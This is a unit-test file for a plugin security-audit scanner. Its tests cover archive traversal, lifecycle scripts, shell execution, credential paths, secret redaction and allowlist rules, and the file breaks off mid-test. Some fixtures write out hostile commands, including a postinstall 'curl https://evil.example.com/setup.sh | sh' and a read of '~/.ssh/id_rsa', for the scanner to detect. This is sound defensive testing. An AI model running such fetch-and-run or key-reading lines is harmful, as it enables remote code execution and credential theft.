"""tests/test_audit_plugins.py - Comprehensive unit tests for the security audit pipeline.

All tests run without network access. ZIP fixtures are created programmatically.
No real secrets, malware, or functioning destructive payloads are used.
"""

import base64
import datetime
import hashlib
import io
import json
import os
import stat
import sys
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import requests

# Ensure the module is importable
os.environ.setdefault("GITHUB_TOKEN", "test-token")
sys.path.insert(0, str(Path(__file__).parent.parent))

import audit_plugins as ap
import plugin_release_utils as pru

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_zip(members: list[tuple[str, bytes | str, int]]) -> bytes:
    """Create an in-memory ZIP with the given members.

    Each member is (name, content, external_attr).
    external_attr=0 means a regular file; use unix mode << 16 for special types.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content, ext_attr in members:
            info = zipfile.ZipInfo(name)
            info.external_attr = ext_attr
            if isinstance(content, str):
                content = content.encode("utf-8")
            zf.writestr(info, content)
    return buf.getvalue()


def _write_zip(path: str, members: list[tuple[str, bytes | str, int]]) -> None:
    Path(path).write_bytes(_make_zip(members))


def _make_temp_zip(data: bytes) -> str:
    """Write bytes to a secure temporary ZIP file and return its path.

    Uses mkstemp to avoid TOCTOU races (unlike the deprecated mktemp).
    Caller is responsible for deleting the file.
    """
    fd, path = tempfile.mkstemp(suffix=".zip")
    try:
        os.write(fd, data)
    finally:
        os.close(fd)
    return path


def _regular(name: str, content: str | bytes = "") -> tuple[str, bytes | str, int]:
    """Helper: regular file member with no special attributes."""
    return (name, content, 0)


# ---------------------------------------------------------------------------
# Repository list parsing
# ---------------------------------------------------------------------------


class TestReadRepoUrls(unittest.TestCase):
    def test_parses_valid_urls(self):
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as f:
            f.write("https://github.com/owner/repo1\n")
            f.write("# comment\n")
            f.write("https://github.com/owner/repo2/\n")
            f.write("\n")
            name = f.name
        try:
            urls = ap.read_repo_urls(name)
            self.assertEqual(
                urls,
                [
                    "https://github.com/owner/repo1",
                    "https://github.com/owner/repo2",
                ],
            )
        finally:
            os.unlink(name)

    def test_deduplicates_urls(self):
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as f:
            f.write("https://github.com/owner/repo1\n")
            f.write("https://github.com/owner/repo1/\n")  # trailing slash variant
            name = f.name
        try:
            urls = ap.read_repo_urls(name)
            self.assertEqual(len(urls), 1)
        finally:
            os.unlink(name)

    def test_raises_on_missing_file(self):
        with self.assertRaises(FileNotFoundError):
            ap.read_repo_urls("/nonexistent/plugins.txt")

    def test_normalises_url_case_for_dedup(self):
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as f:
            f.write("https://github.com/Owner/Repo\n")
            f.write("https://github.com/owner/repo\n")
            name = f.name
        try:
            urls = ap.read_repo_urls(name)
            self.assertEqual(len(urls), 1)
        finally:
            os.unlink(name)


# ---------------------------------------------------------------------------
# URL normalisation helper
# ---------------------------------------------------------------------------


class TestNormaliseRepoKey(unittest.TestCase):
    def test_full_url(self):
        self.assertEqual(
            ap._normalise_repo_key("https://github.com/Owner/MyRepo"),
            "owner/myrepo",
        )

    def test_owner_repo(self):
        self.assertEqual(ap._normalise_repo_key("Owner/MyRepo"), "owner/myrepo")

    def test_trailing_slash(self):
        self.assertEqual(
            ap._normalise_repo_key("https://github.com/Owner/MyRepo/"),
            "owner/myrepo",
        )


# ---------------------------------------------------------------------------
# ZIP inspection
# ---------------------------------------------------------------------------


class TestZipInspection(unittest.TestCase):
    def _write(self, members):
        return _make_temp_zip(_make_zip(members))

    def test_valid_zip_passes(self):
        path = self._write([_regular("plugin/main.py", "print('hello')")])
        try:
            stats, findings = ap.inspect_zip(path)
            self.assertTrue(stats.safe)
            blocks = [f for f in findings if f.classification == "BLOCK"]
            self.assertEqual(blocks, [])
        finally:
            os.unlink(path)

    def test_absolute_path_blocked(self):
        path = self._write([_regular("/etc/passwd", "root:x:0:0")])
        try:
            stats, findings = ap.inspect_zip(path)
            self.assertFalse(stats.safe)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_TRAVERSAL", rule_ids)
        finally:
            os.unlink(path)

    def test_dotdot_traversal_blocked(self):
        path = self._write([_regular("../evil.py", "import os")])
        try:
            stats, findings = ap.inspect_zip(path)
            self.assertFalse(stats.safe)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_TRAVERSAL", rule_ids)
        finally:
            os.unlink(path)

    def test_windows_path_traversal_blocked(self):
        path = self._write([_regular("C:\\Windows\\system32\\evil.exe", b"\x4d\x5a")])
        try:
            stats, findings = ap.inspect_zip(path)
            self.assertFalse(stats.safe)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_TRAVERSAL", rule_ids)
        finally:
            os.unlink(path)

    def test_null_byte_in_path_blocked(self):
        # Test _is_safe_member_path directly since Python 3.12's zipfile
        # may reject null bytes before we can inspect them.
        safe, reason = ap._is_safe_member_path("plugin\x00hidden.py")
        self.assertFalse(safe)
        self.assertIn("null", reason)

    def test_duplicate_normalised_paths_flagged(self):
        # Two paths that normalise to the same name (case collision)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("plugin/Main.py", "a")
            zf.writestr("plugin/main.py", "b")
        path = _make_temp_zip(buf.getvalue())
        try:
            stats, findings = ap.inspect_zip(path)
            rule_ids = [f.rule_id for f in findings]
            self.assertIn("ARCHIVE_DUPLICATE_PATH", rule_ids)
        finally:
            os.unlink(path)

    def test_file_count_limit(self):
        policy = ap._default_policy()
        policy["archive"]["max_files"] = 3
        members = [_regular(f"file{i}.txt", "") for i in range(5)]
        path = self._write(members)
        try:
            stats, findings = ap.inspect_zip(path, policy)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_FILE_COUNT_EXCEEDED", rule_ids)
        finally:
            os.unlink(path)

    def test_total_size_limit(self):
        policy = ap._default_policy()
        policy["archive"]["max_uncompressed_bytes"] = 10
        # Create content larger than limit (compression may reduce size)
        big_content = "x" * 100  # larger than limit of 10
        path = self._write([_regular("big.txt", big_content)])
        try:
            stats, findings = ap.inspect_zip(path, policy)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_BOMB_SIZE", rule_ids)
        finally:
            os.unlink(path)

    def test_compression_ratio_limit(self):
        policy = ap._default_policy()
        policy["archive"]["max_compression_ratio"] = 2
        # Highly compressible content
        big_zeros = b"\x00" * 50000
        path = self._write([_regular("zeros.bin", big_zeros)])
        try:
            stats, findings = ap.inspect_zip(path, policy)
            # Ratio may or may not exceed 2; just verify the check runs
            self.assertIsNotNone(stats.compression_ratio)
        finally:
            os.unlink(path)

    def test_setuid_permission_bits_blocked(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            info = zipfile.ZipInfo("plugin/helper")
            # Set setuid bit in Unix mode
            info.external_attr = (0o4755 | stat.S_IFREG) << 16
            zf.writestr(info, b"#!/bin/sh\nid\n")
        path = _make_temp_zip(buf.getvalue())
        try:
            stats, findings = ap.inspect_zip(path)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_SETUID_FILE", rule_ids)
        finally:
            os.unlink(path)

    def test_device_file_blocked(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            info = zipfile.ZipInfo("plugin/dev")
            # Character device type (0x2000)
            info.external_attr = (0x2000 | 0o666) << 16
            zf.writestr(info, b"")
        path = _make_temp_zip(buf.getvalue())
        try:
            _, findings = ap.inspect_zip(path)
            rule_ids = {f.rule_id for f in findings}
            self.assertIn("ARCHIVE_DEVICE_FILE", rule_ids)
        finally:
            os.unlink(path)

    def test_corrupt_zip_is_not_a_fabricated_structural_block(self):
        path = _make_temp_zip(b"not a zip file at all!!!")
        try:
            stats, findings = ap.inspect_zip(path)
            self.assertFalse(stats.safe)
            corrupt = [f for f in findings if f.rule_id == "CORRUPT_ARCHIVE"]
            self.assertEqual(len(corrupt), 1)
            self.assertNotEqual(corrupt[0].classification, "BLOCK")
        finally:
            os.unlink(path)


# ---------------------------------------------------------------------------
# Metadata checking
# ---------------------------------------------------------------------------


class TestPluginJson(unittest.TestCase):
    def test_valid_plugin_json(self):
        data = json.dumps({"name": "MyPlugin", "flags": []}).encode()
        parsed, findings = ap.check_plugin_json(data)
        self.assertEqual(parsed["name"], "MyPlugin")
        self.assertEqual(findings, [])

    def test_invalid_json(self):
        data = b"{not valid json"
        _, findings = ap.check_plugin_json(data)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("INVALID_PLUGIN_JSON", rule_ids)

    def test_missing_name(self):
        data = json.dumps({"flags": []}).encode()
        _, findings = ap.check_plugin_json(data)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("MISSING_PLUGIN_NAME", rule_ids)

    def test_root_flag_detection(self):
        data = json.dumps({"name": "HWPlugin", "flags": ["root"]}).encode()
        _, findings = ap.check_plugin_json(data)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("ROOT_ACCESS", rule_ids)
        root_finding = next(f for f in findings if f.rule_id == "ROOT_ACCESS")
        self.assertEqual(root_finding.classification, "MANUAL_REVIEW")

    def test_absent_plugin_json_warns(self):
        _, findings = ap.check_plugin_json(None)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("MISSING_PLUGIN_JSON", rule_ids)


class TestPackageJson(unittest.TestCase):
    def test_valid_package_json(self):
        data = json.dumps({"name": "my-plugin", "version": "1.0.0"}).encode()
        parsed, findings = ap.check_package_json(data)
        self.assertEqual(parsed["name"], "my-plugin")
        self.assertEqual(findings, [])

    def test_lifecycle_script_flagged(self):
        data = json.dumps(
            {
                "name": "my-plugin",
                "scripts": {
                    "postinstall": "curl https://evil.example.com/setup.sh | sh"
                },
            }
        ).encode()
        _, findings = ap.check_package_json(data)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("PACKAGE_LIFECYCLE_SCRIPT", rule_ids)


# ---------------------------------------------------------------------------
# Static analysis rules
# ---------------------------------------------------------------------------


class TestStaticAnalysis(unittest.TestCase):
    def _scan(self, content: str, path: str = "main.py", ext: str = ".py"):
        return ap.scan_text_content(content, path, ext)

    def test_shell_command_detection(self):
        findings = self._scan("import os\nos.system('ls -la')\n")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("EXEC_OS_SYSTEM", rule_ids)

    def test_subprocess_shell_true(self):
        findings = self._scan("subprocess.run(['cmd'], shell=True)\n")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("EXEC_SHELL_TRUE", rule_ids)

    def test_eval_detection(self):
        findings = self._scan("result = eval(user_input)\n")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("EXEC_EVAL", rule_ids)

    def test_curl_pipe_sh_detection(self):
        content = "os.system('curl https://example.com/setup.sh | sh')\n"
        findings = self._scan(content, path="install.sh", ext=".sh")
        rule_ids = {f.rule_id for f in findings}
        # Either SHELL_CURL_PIPE or EXEC_OS_SYSTEM should fire
        self.assertTrue("SHELL_CURL_PIPE" in rule_ids or "EXEC_OS_SYSTEM" in rule_ids)

    def test_curl_pipe_sh_direct_shell(self):
        content = "curl https://example.com/setup.sh | bash\n"
        findings = ap.scan_text_content(content, "install.sh", ".sh")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("SHELL_CURL_PIPE", rule_ids)
        block_findings = [f for f in findings if f.rule_id == "SHELL_CURL_PIPE"]
        self.assertEqual(block_findings[0].classification, "BLOCK")

    def test_systemd_persistence_detection(self):
        content = "[Unit]\nDescription=evil\n\n.service [Unit]\nDescription=test\n"
        findings = self._scan(content, "install.py")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("PERSIST_SYSTEMD_SERVICE", rule_ids)

    def test_credential_path_access(self):
        content = "key_path = os.path.expanduser('~/.ssh/id_rsa')\n"
        findings = self._scan(content)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("SENSITIVE_SSH_KEY", rule_ids)

    def test_disabled_tls_verification(self):
        findings = self._scan("requests.get(url, verify=False)\n")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("NETWORK_DISABLED_TLS", rule_ids)

    def test_plugin_namespaced_env_read_is_warning(self):
        findings = self._scan('api_key = os.environ.get("SYNCTHING_API_KEY")\n')
        ap._downgrade_plugin_namespaced_env_findings(findings, "Syncthing")
        env_finding = next(
            finding
            for finding in findings
            if finding.rule_id == "SENSITIVE_ENV_HARVEST"
        )
        self.assertEqual(env_finding.classification, "PASS_WITH_WARNINGS")

    def test_well_known_sensitive_env_reads_stay_manual_review(self):
        for env_name in (
            "GITHUB_TOKEN",
            "AWS_SECRET_ACCESS_KEY",
            "STEAM_API_KEY",
            "SSH_PRIVATE_KEY",
        ):
            with self.subTest(env_name=env_name):
                findings = self._scan(f'value = os.environ.get("{env_name}")\n')
                ap._downgrade_plugin_namespaced_env_findings(
                    findings, env_name.split("_", 1)[0]
                )
                env_finding = next(
                    finding
                    for finding in findings
                    if finding.rule_id == "SENSITIVE_ENV_HARVEST"
                )
                self.assertEqual(env_finding.classification, "MANUAL_REVIEW")

    def test_base64_obfuscation_large_string(self):
        large_b64 = base64.b64encode(b"A" * 200).decode()
        content = f'data = "{large_b64}"\n'
        findings = self._scan(content)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("OBFUSCATION_LARGE_BASE64", rule_ids)

    def test_static_rules_redact_secrets_in_evidence(self):
        token = "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        content = f"subprocess.run(cmd)  # token {token}\n"
        findings = self._scan(content)
        self.assertTrue(len(findings) > 0)
        for f in findings:
            self.assertNotIn(token, f.evidence)
            self.assertIn("[REDACTED]", f.evidence)

    def test_finding_post_init_redacts_evidence(self):
        token = "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        f = ap.Finding(
            rule_id="TEST_RULE",
            severity="HIGH",
            classification="BLOCK",
            path="test.py",
            line=1,
            message="test message",
            evidence=f"secret = '{token}'",
            scanner="static",
        )
        self.assertNotIn(token, f.evidence)
        self.assertIn("[REDACTED]", f.evidence)

    def test_redaction_end_to_end_report_surfaces(self):
        token = "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        content = f"subprocess.run(cmd)  # token {token}\n"
        findings = self._scan(content)
        self.assertTrue(len(findings) > 0)
        report = ap.AuditReport(
            audit_timestamp="2026-08-03T12:00:00Z",
            repository="https://github.com/example/test-repo",
            findings=findings,
            final_classification="BLOCK",
        )
        with tempfile.TemporaryDirectory() as tmp:
            json_path, md_path = ap.write_reports([report], tmp)
            summary_path = os.path.join(tmp, "step_summary.md")
            with open(summary_path, "w", encoding="utf-8") as f:
                f.write(ap.generate_markdown_report(report))

            reports = [json_path, md_path, summary_path]
            for rpath in reports:
                self.assertTrue(os.path.exists(rpath), f"Missing report: {rpath}")
                self.assertGreater(os.path.getsize(rpath), 0, f"Empty report: {rpath}")
                text = Path(rpath).read_text(encoding="utf-8")
                self.assertNotIn(
                    token, text, f"Token leaked in report surface: {rpath}"
                )
                self.assertIn(
                    "[REDACTED]", text, f"Redaction marker missing in: {rpath}"
                )


# ---------------------------------------------------------------------------
# URL and domain extraction
# ---------------------------------------------------------------------------


class TestUrlExtraction(unittest.TestCase):
    def test_extracts_https_urls(self):
        content = "fetch('https://api.example.com/data')"
        urls, domains = ap.extract_urls_and_domains(content)
        self.assertIn("https://api.example.com/data", urls)
        self.assertIn("api.example.com", domains)

    def test_extracts_multiple_domains(self):
        content = (
            "url1 = 'https://cdn.example.com/a.js'\nurl2 = 'https://api.other.com/v1'\n"
        )
        _, domains = ap.extract_urls_and_domains(content)
        self.assertIn("cdn.example.com", domains)
        self.assertIn("api.other.com", domains)

    def test_extracts_ip_addresses(self):
        content = "server = '192.168.1.100'\n"
        _, domains = ap.extract_urls_and_domains(content)
        self.assertIn("192.168.1.100", domains)


# ---------------------------------------------------------------------------
# Secrets scanning
# ---------------------------------------------------------------------------


class TestSecretsScanning(unittest.TestCase):
    def test_private_key_header_detected(self):
        content = "key = '-----BEGIN RSA PRIVATE KEY-----\\nMIIE...'\n"
        findings = ap.scan_for_secrets(content, "config.py")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("SECRET_PRIVATE_KEY_HEADER", rule_ids)

    def test_secret_value_redacted(self):
        content = "token = 'ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1'\n"
        findings = ap.scan_for_secrets(content, "config.py")
        for f in findings:
            self.assertNotIn("ghp_AAA", f.evidence)
            self.assertIn(ap.SECRET_REDACT, f.evidence)

    def test_fixture_comment_and_filename_substring_do_not_lower_severity(self):
        content = "# test fixture: password = 'my_test_password_here'\n"
        findings = ap.scan_for_secrets(content, "test_config.py")
        password_findings = [
            finding
            for finding in findings
            if finding.rule_id == "SECRET_PASSWORD_LITERAL"
        ]
        self.assertEqual(len(password_findings), 1)
        self.assertEqual(password_findings[0].severity, "critical")
        self.assertEqual(password_findings[0].classification, "BLOCK")

    def test_github_token_pattern_detected(self):
        content = "token = 'ghp_" + "A" * 36 + "'\n"
        findings = ap.scan_for_secrets(content, "auth.py")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("SECRET_GITHUB_TOKEN", rule_ids)


# ---------------------------------------------------------------------------
# Binary detection
# ---------------------------------------------------------------------------


class TestBinaryDetection(unittest.TestCase):
    def _minimal_elf(self) -> bytes:
        """Minimal valid ELF header (64-byte ELF header, x86_64)."""
        header = bytearray(64)
        header[0:4] = b"\x7fELF"
        header[4] = 2  # 64-bit
        header[5] = 1  # little-endian
        header[6] = 1  # ELF version
        header[18] = 0x3E  # x86_64 machine type
        return bytes(header)

    def test_elf_detection(self):
        data = self._minimal_elf()
        result = ap.identify_binary(data, "helper")
        self.assertIsNotNone(result)
        self.assertEqual(result["type"], "elf_binary")
        self.assertEqual(result["architecture"], "x86_64")

    def test_pe_detection(self):
        data = b"MZ" + b"\x00" * 14
        result = ap.identify_binary(data, "plugin.exe")
        self.assertIsNotNone(result)
        self.assertEqual(result["type"], "pe_binary")

    def test_regular_text_not_binary(self):
        data = b"#!/usr/bin/env python3\nprint('hello')\n"
        result = ap.identify_binary(data, "main.py")
        self.assertIsNone(result)

    def test_short_data_not_binary(self):
        result = ap.identify_binary(b"\x7f", "tiny")
        self.assertIsNone(result)


# ---------------------------------------------------------------------------
# Classification logic
# ---------------------------------------------------------------------------


class TestClassification(unittest.TestCase):
    def _finding(self, classification: str, severity: str = "high") -> ap.Finding:
        return ap.Finding(
            rule_id="TEST",
            severity=severity,
            classification=classification,
            path="test.py",
            line=1,
            message="test",
            evidence="",
            scanner="test",
        )

    def test_no_findings_is_pass(self):
        cls, score = ap.classify_findings([])
        self.assertEqual(cls, "PASS")
        self.assertEqual(score, 0)

    def test_block_wins_over_manual_review(self):
        findings = [
            self._finding("MANUAL_REVIEW"),
            self._finding("BLOCK", "critical"),
        ]
        cls, _ = ap.classify_findings(findings)
        self.assertEqual(cls, "BLOCK")

    def test_manual_review_without_block(self):
        findings = [
            self._finding("MANUAL_REVIEW"),
            self._finding("PASS_WITH_WARNINGS", "low"),
        ]
        cls, _ = ap.classify_findings(findings)
        self.assertEqual(cls, "MANUAL_REVIEW")

    def test_warnings_only(self):
        findings = [self._finding("PASS_WITH_WARNINGS", "medium")]
        cls, _ = ap.classify_findings(findings)
        self.assertEqual(cls, "PASS_WITH_WARNINGS")

    def test_has_error_returns_audit_error(self):
        cls, _ = ap.classify_findings([], has_error=True)
        self.assertEqual(cls, "AUDIT_ERROR")

    def test_allowlisted_findings_excluded_from_classification(self):
        findings = [self._finding("BLOCK", "critical")]
        findings[0].allowlisted = True
        cls, _ = ap.classify_findings(findings)
        self.assertEqual(cls, "PASS")

    def test_severity_score_aggregation(self):
        findings = [
            self._finding("PASS_WITH_WARNINGS", "critical"),  # 40
            self._finding("PASS_WITH_WARNINGS", "high"),  # 15
        ]
        _, score = ap.classify_findings(findings)
        self.assertEqual(score, 55)


# ---------------------------------------------------------------------------
# Allowlist
# ---------------------------------------------------------------------------


class TestAllowlist(unittest.TestCase):
    def _write_allowlist(self, exceptions: list[dict]) -> str:
        with tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False) as f:
            f.write("version: '1'\nexceptions:\n")
            for exc in exceptions:
                f.write("  - ")
                for k, v in exc.items():
                    f.write(f'{k}: "{v}"\n    ')
                f.write("\n")
            return f.name

    def _make_allowlist(
        self, exceptions: list[dict], policy: dict | None = None
    ) -> list[dict]:
        name = self._write_allowlist(exceptions)
        try:
            return ap.load_allowlist(name, policy=policy)
        finally:
            os.unlink(name)

    def _exception(self, rule_id: str, sha: str) -> dict:
        return {
            "repository": "owner/repo",
            "release": "1.0.0",
            "artifact_sha256": sha,
            "rule": rule_id,
            "reason": "reviewed fixture",
            "approved_by": "reviewer",
            "expires": "2027-01-01",
        }

    def _block_finding(self, rule_id: str = "ROOT_ACCESS") -> ap.Finding:
        return ap.Finding(
            rule_id=rule_id,
            severity="high",
            classification="BLOCK",
            path="main.py",
            line=1,
            message="test",
            evidence="test",
            scanner="test",
        )

    def test_matching_entry_allowlists_finding(self):
        sha = "a" * 64
        # Build exceptions directly
        excs = [self._exception("ROOT_ACCESS", sha)]
        finding = self._block_finding("ROOT_ACCESS")
        findings, decisions = ap.apply_allowlist(
            [finding],
            excs,
            "https://github.com/owner/repo",
            "1.0.0",
            sha,
        )
        self.assertTrue(findings[0].allowlisted)
        self.assertEqual(len(decisions), 1)

    def test_hash_mismatch_does_not_allowlist(self):
        excs = [self._exception("ROOT_ACCESS", "a" * 64)]
        finding = self._block_finding("ROOT_ACCESS")
        findings, decisions = ap.apply_allowlist(
            [finding],
            excs,
            "https://github.com/owner/repo",
            "1.0.0",
            "b" * 64,
        )
        self.assertFalse(findings[0].allowlisted)

    def test_expired_entry_does_not_allowlist(self):
        excs = [
            {
                **self._exception("ROOT_ACCESS", "a" * 64),
                "expires": "2020-01-01",
            }
        ]
        finding = self._block_finding("ROOT_ACCESS")
        findings, _ = ap.apply_allowlist(
            [finding],
            excs,
            "https://github.com/owner/repo",
            "1.0.0",
            "a" * 64,
        )
        self.assertFalse(findings[0].allowlisted)

    def test_malware_requires_exact_hash(self):
        """MALWARE rule cannot be allowlisted with artifact_sha256='any'."""
        excs = [self._exception("MALWARE", "any")]
        finding = self._block_finding("MALWARE")
        findings, _ = ap.apply_allowlist(
            [finding],
            excs,
            "https://github.com/owner/repo",
            "1.0.0",
            "a" * 64,
        )
        self.assertFalse(findings[0].allowlisted)

    def test_every_live_blockable_rule_requires_exact_lowercase_hash(self):
        policy = ap.load_policy("security-policy.yml")
        current_sha = "a" * 64

        for rule_id in policy["blockable_rules"]:
            with self.subTest(rule_id=rule_id):
                for rejected in ("any", "A" * 64, "a" * 63, "g" * 64):
                    name = self._write_allowlist([self._exception(rule_id, rejected)])
                    try:
                        with self.assertRaises(ValueError):
                            ap.load_allowlist(name, policy=policy)
                    finally:
                        os.unlink(name)

                exceptions = self._make_allowlist(
                    [self._exception(rule_id, current_sha)], policy=policy
                )
                finding = self._block_finding(rule_id)
                findings, decisions = ap.apply_allowlist(
                    [finding],
                    exceptions,
                    "https://github.com/owner/repo",
                    "1.0.0",
                    current_sha,
                    policy=policy,
                )
                self.assertTrue(findings[0].allowlisted)
                self.assertEqual(len(decisions), 1)

    def test_new_blockable_rule_immediately_requires_exact_hash(self):
        policy = ap._default_policy()
        policy["blockable_rules"].append("ROOT_ACCESS")
        name = self._write_allowlist([self._exception("ROOT_ACCESS", "any")])
        try:
            with self.assertRaises(ValueError):
                ap.load_allowlist(name, policy=policy)
        finally:
            os.unlink(name)

    def test_non_blockable_rule_may_use_any_with_complete_scope(self):
        policy = ap._default_policy()
        exceptions = self._make_allowlist(
            [self._exception("ROOT_ACCESS", "any")], policy=policy
        )
        finding = self._block_finding("ROOT_ACCESS")

        findings, decisions = ap.apply_allowlist(
            [finding],
            exceptions,
            "https://github.com/owner/repo",
            "1.0.0",
            "a" * 64,
            policy=policy,
        )

        self.assertTrue(findings[0].allowlisted)
        self.assertEqual(len(decisions), 1)

    def test_invalid_allowlist_raises(self):
        with tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False) as f:
            f.write(
                "version: '1'\nexceptions:\n  - rule: ONLY_RULE\n    reason: x\n    approved_by: y\n"
            )
            name = f.name
        try:
            with self.assertRaises(ValueError):
                ap.load_allowlist(name)
        finally:
            os.unlink(name)

    def test_missing_required_scope_fields_raise(self):
        for field in ("release", "artifact_sha256", "expires"):
            with self.subTest(field=field):
                base = {
                    "repository": "owner/repo",
                    "release": "1.0.0",
                    "artifact_sha256": "a" * 64,
                    "rule": "ROOT_ACCESS",
                    "reason": "test",
                    "approved_by": "reviewer",
                    "expires": "2027-01-01",
                }
                base.pop(field)
                with tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False) as f:
                    f.write("version: '1'\nexceptions:\n")
                    f.write("  -\n")
                    for k, v in base.items():
                        f.write(f'    {k}: "{v}"\n')
                    name = f.name
                try:
                    with self.assertRaises(ValueError):
                        ap.load_allowlist(name)
                finally:
                    os.unlink(name)

    def test_expired_entry_warning(self):
        excs = [
            {
                "repository": "owner/repo",
                "rule": "ROOT_ACCESS",
                "reason": "test",
                "approved_by": "reviewer",
                "expires": "2000-01-01",
            }
        ]
        warnings = ap.check_allowlist_expiry(excs)
        self.assertTrue(any("expired" in w.lower() for w in warnings))

    def test_future_expiry_no_warning(self):
        future = (datetime.date.today() + datetime.timedelta(days=365)).isoformat()
        excs = [
            {
                "repository": "owner/repo",
                "rule": "ROOT_ACCESS",
                "reason": "test",
                "approved_by": "reviewer",
                "expires": future,
            }
        ]
        warnings = ap.check_allowlist_expiry(excs)
        self.assertEqual(warnings, [])


# ---------------------------------------------------------------------------
# Policy loading
# ---------------------------------------------------------------------------


class TestPolicyLoading(unittest.TestCase):
    def test_load_defaults_when_file_absent(self):
        policy = ap.load_policy("/nonexistent/policy.yml")
        self.assertEqual(policy["enforcement"]["mode"], "report-only")
        self.assertIn("archive", policy)

    def test_load_policy_merges_with_defaults(self):
        with tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False) as f:
            f.write("version: '1'\nenforcement:\n  mode: enforce\n")
            name = f.name
        try:
            policy = ap.load_policy(name)
            self.assertEqual(policy["enforcement"]["mode"], "enforce")
            # Defaults still present
            self.assertIn("archive", policy)
        finally:
            os.unlink(name)

    def test_repository_policy_enables_semgrep_as_optional(self):
        policy_path = Path(ap.__file__).with_name("security-policy.yml")
        policy = ap.load_policy(str(policy_path))

        self.assertEqual(
            policy["scanners"]["semgrep"],
            {"enabled": True, "required": False},
        )

    def test_unknown_rule_classification_override_is_rejected(self):
        with tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False) as f:
            f.write(
                "version: '1'\n"
                "rule_classifications:\n"
                "  PRIVILEGE_SDUO: PASS_WITH_WARNINGS\n"
            )
            name = f.name
        try:
            with self.assertRaisesRegex(ValueError, "PRIVILEGE_SDUO"):
                ap.load_policy(name)
        finally:
            os.unlink(name)

    def test_invalid_rule_classification_tier_is_rejected(self):
        with tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False) as f:
            f.write("version: '1'\nrule_classifications:\n  PRIVILEGE_SUDO: IGNORE\n")
            name = f.name
        try:
            with self.assertRaisesRegex(ValueError, "IGNORE"):
                ap.load_policy(name)
        finally:
            os.unlink(name)

    def test_rule_classification_override_changes_context_hash(self):
        first = ap._default_policy()
        second = ap._default_policy()
        first["rule_classifications"]["PRIVILEGE_SUDO"] = "PASS_WITH_WARNINGS"
        second["rule_classifications"]["PRIVILEGE_SUDO"] = "MANUAL_REVIEW"

        self.assertNotEqual(
            ap.compute_audit_context_hash(first, []),
            ap.compute_audit_context_hash(second, []),
        )


class TestRuleClassificationOverrides(unittest.TestCase):
    def _policy(self, overrides: dict[str, str]) -> dict:
        policy = ap._default_policy()
        policy["rule_classifications"] = overrides
        return policy

    def test_demoted_rule_still_fires_as_warning(self):
        findings = ap.scan_text_content(
            'subprocess.run(["sudo", "systemctl", "restart", "service"])',
            "main.py",
            ".py",
        )

        ap.apply_rule_classification_overrides(
            findings,
            self._policy({"PRIVILEGE_SUDO": "PASS_WITH_WARNINGS"}),
        )

        sudo_finding = next(f for f in findings if f.rule_id == "PRIVILEGE_SUDO")
        self.assertEqual(sudo_finding.classification, "PASS_WITH_WARNINGS")
        self.assertEqual(ap.classify_findings(findings)[0], "MANUAL_REVIEW")

        ap.apply_rule_classification_overrides(
            findings,
            self._policy(
                {
                    "PRIVILEGE_SUDO": "PASS_WITH_WARNINGS",
                    "PRIVILEGE_SYSTEMCTL": "PASS_WITH_WARNINGS",
                }
            ),
        )
        self.assertEqual(ap.classify_findings(findings)[0], "PASS_WITH_WARNINGS")
        self.assertEqual(
            {f.rule_id for f in findings},
            {"EXEC_SUBPROCESS_RUN", "PRIVILEGE_SUDO", "PRIVILEGE_SYSTEMCTL"},
        )

    def test_promoted_rule_escalates(self):
        findings = ap.scan_text_content(
            'subprocess.run(["true"])',
            "main.py",
            ".py",
        )

        ap.apply_rule_classification_overrides(
            findings,
            self._policy({"EXEC_SUBPROCESS_RUN": "MANUAL_REVIEW"}),
        )

        self.assertEqual(findings[0].classification, "MANUAL_REVIEW")
        self.assertEqual(ap.classify_findings(findings)[0], "MANUAL_REVIEW")

    def test_non_structural_block_rules_are_capped_at_manual_review(self):
        block_rule_ids = {
            "SHELL_CURL_PIPE",
            "DESTRUCTIVE_RM_RF",
            "DESTRUCTIVE_RM_RF_SHELL",
